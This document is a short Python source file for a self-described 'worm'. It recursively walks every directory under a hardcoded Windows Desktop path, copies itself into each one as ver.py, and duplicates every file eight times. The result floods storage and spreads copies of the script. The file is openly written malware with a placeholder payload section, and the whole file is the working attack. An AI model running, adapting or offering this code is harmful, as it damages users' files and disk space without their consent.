import os
import shutil

# Initializing class
class Ver:
    # Checking wether the user has passed an arg or not
    def __init__(self, path=None, listOfTargetDirs=None, iteration=None):
        if isinstance(path, type(None)):
            self.path ="/"
        else:
            self.path = path
    
        if isinstance(listOfTargetDirs, type(None)):
            self.listOfTargetDirs = []
        else:
            self.listOfTargetDirs = listOfTargetDirs

        if isinstance(iteration, type (None)):
            self.iteration = 1
        else:
            self.iteration = iteration

        self.currentPath = os.path.realpath(__file__)

    # Checking files, dirs and sub dirs
    def func_listDirs(self, path):
        self.listOfTargetDirs.append(path)
        filesInCurrentDir = os.listdir(path)

        for file in filesInCurrentDir:
            if not file.startswith('.'):
                absolutePath = os.path.join(path, file)

                if os.path.isdir(absolutePath):
                    self.func_listDirs(absolutePath)
                else:
                    pass
    # Cloning the worm into dirs and sub dirs            
    def func_createWorm(self):
        for directory in self.listOfTargetDirs:
            destination = os.path.join(directory, "ver.py")
            shutil.copyfile(self.currentPath, destination)

    # Cloning existing files into their parent dir
    def func_copyExistingFiles(self):
        for directory in self.listOfTargetDirs:
            filesInDir = os.listdir(directory)
            for file in filesInDir:
                absolutePath = os.path.join(directory, file)
                if not absolutePath.startswith('.') and not os.path.isdir(absolutePath):
                    sourceDir = absolutePath
                    for i in range(self.iteration):
                        destination = os.path.join(directory,(file + str(i)))
                        shutil.copyfile(sourceDir, destination)

# Executing the worm
if __name__ == "__main__":
    currentDirectory = os.path.abspath(r"C:\Users\user\Desktop")
    worm = Ver(path = currentDirectory, iteration = 8)
    worm.func_listDirs(worm.path)
    worm.func_createWorm()
    worm.func_copyExistingFiles()

#################### Payload ####################
# Nothing to see here for now :(